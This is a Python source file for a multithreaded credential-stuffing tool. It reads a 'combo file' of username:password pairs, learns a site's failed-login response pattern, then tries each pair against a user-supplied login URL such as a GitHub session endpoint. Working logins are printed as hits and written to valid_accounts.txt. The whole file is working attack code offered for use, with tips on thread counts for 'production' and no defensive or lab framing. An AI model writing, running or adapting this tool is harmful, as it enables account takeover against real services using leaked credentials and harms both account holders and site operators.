from input_engine import InputEngine
from login_detector import Calibrator, PatternAnalyzer, LoginDetector
import time
import threading
from queue import Queue
from datetime import datetime

class ThreadedCredentialChecker:
    def __init__(self, login_url, username_field='username', password_field='password', num_threads=10):
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.num_threads = num_threads
        
        self.credential_queue = Queue()
        self.valid_credentials = []
        self.tested_count = 0
        self.lock = threading.Lock()
        
        print("=" * 60)
        print("INITIALIZING THREADED CREDENTIAL CHECKER")
        print("=" * 60)
        
        calibrator = Calibrator(login_url, username_field, password_field)
        calibrator.run_calibration(num_attempts=5, delay=2)
        
        analyzer = PatternAnalyzer(calibrator.calibration_responses)
        self.failure_pattern = analyzer.analyze()
        
        self.calibrator = calibrator
    
    def worker(self, thread_id):
        from login_detector import Calibrator, LoginDetector
        
        thread_calibrator = Calibrator(self.login_url, self.username_field, self.password_field)
        
        class SimpleAnalyzer:
            def __init__(self, pattern):
                self.pattern = pattern
            def get_pattern(self):
                return self.pattern
        
        thread_analyzer = SimpleAnalyzer(self.failure_pattern)
        thread_detector = LoginDetector(thread_calibrator, thread_analyzer)
        
        while True:
            try:
                username, password = self.credential_queue.get(timeout=1)
                
                is_success, response, score, deviations = thread_detector.test_credential(username, password)
                
                with self.lock:
                    self.tested_count += 1
                    
                    if is_success:
                        print(f"\n🎯 [Thread-{thread_id}] POTENTIAL HIT: {username}:{password}")
                        print(f"   Deviation Score: {score}/8")
                        for reason in deviations:
                            print(f"   - {reason}")
                        
                        self.valid_credentials.append((username, password))
                        self.save_valid_credential(username, password)
                    else:
                        if self.tested_count % 10 == 0:
                            print(f"   [Progress: {self.tested_count} tested]")
                
                self.credential_queue.task_done()
                time.sleep(2)
                
            except:
                break
    
    def save_valid_credential(self, username, password):
        with open('valid_accounts.txt', 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {username}:{password}\n")
    
    def run(self, combo_file):
        print("\n" + "=" * 60)
        print(f"STARTING {self.num_threads} WORKER THREADS")
        print("=" * 60)
        
        start_time = time.time()
        
        engine = InputEngine(combo_file)
        credential_count = 0
        
        for username, password in engine.load_credentials():
            self.credential_queue.put((username, password))
            credential_count += 1
        
        print(f"✓ Loaded {credential_count} credentials into queue")
        
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"✓ Started {self.num_threads} worker threads")
        print("\n" + "=" * 60)
        print("TESTING IN PROGRESS...")
        print("=" * 60)
        
        self.credential_queue.join()
        
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        
        print("\n" + "=" * 60)
        print("FINAL SUMMARY")
        print("=" * 60)
        print(f"Total tested: {self.tested_count}")
        print(f"Potential hits: {len(self.valid_credentials)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Average speed: {self.tested_count/elapsed:.2f} credentials/second")
        
        if self.valid_credentials:
            print(f"\n✓ Valid credentials saved to: valid_accounts.txt")
            print("\nFound credentials:")
            for username, password in self.valid_credentials:
                print(f"  🎯 {username}:{password}")
        else:
            print("\n⚠ No valid credentials found")


def main():
    print("=" * 60)
    print("CREDENTIAL TESTING TOOL - INTERACTIVE MODE")
    print("=" * 60)
    print()
    
    # Get user inputs
    combo_file = input("Enter path to combo file (default: combo.txt): ").strip()
    if not combo_file:
        combo_file = 'combo.txt'
    
    print("\n--- Login Endpoint Configuration ---")
    print("Example: https://example.com/login or https://github.com/session")
    login_url = input("Enter login URL: ").strip()
    
    if not login_url:
        print("❌ Error: Login URL is required!")
        return
    
    print("\n--- Form Field Names ---")
    print("(Check the HTML form to find these)")
    print("Common examples: 'username', 'email', 'login', 'user'")
    username_field = input("Enter username field name (default: username): ").strip()
    if not username_field:
        username_field = 'username'
    
    print("Common examples: 'password', 'pass', 'pwd'")
    password_field = input("Enter password field name (default: password): ").strip()
    if not password_field:
        password_field = 'password'
    
    print("\n--- Threading Configuration ---")
    print("Recommended: 3-5 for testing, 10-15 for production")
    num_threads_input = input("Enter number of threads (default: 5): ").strip()
    if num_threads_input and num_threads_input.isdigit():
        num_threads = int(num_threads_input)
    else:
        num_threads = 5
    
    # Confirmation
    print("\n" + "=" * 60)
    print("CONFIGURATION SUMMARY")
    print("=" * 60)
    print(f"Combo file: {combo_file}")
    print(f"Login URL: {login_url}")
    print(f"Username field: {username_field}")
    print(f"Password field: {password_field}")
    print(f"Threads: {num_threads}")
    print("=" * 60)
    
    confirm = input("\nProceed? (yes/no): ").strip().lower()
    if confirm not in ['yes', 'y']:
        print("Cancelled.")
        return
    
    print("\n")
    
    # Create and run checker
    try:
        checker = ThreadedCredentialChecker(
            login_url=login_url,
            username_field=username_field,
            password_field=password_field,
            num_threads=num_threads
        )
        
        checker.run(combo_file)
        
    except FileNotFoundError:
        print(f"\n❌ Error: File '{combo_file}' not found!")
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")


if __name__ == "__main__":
    main()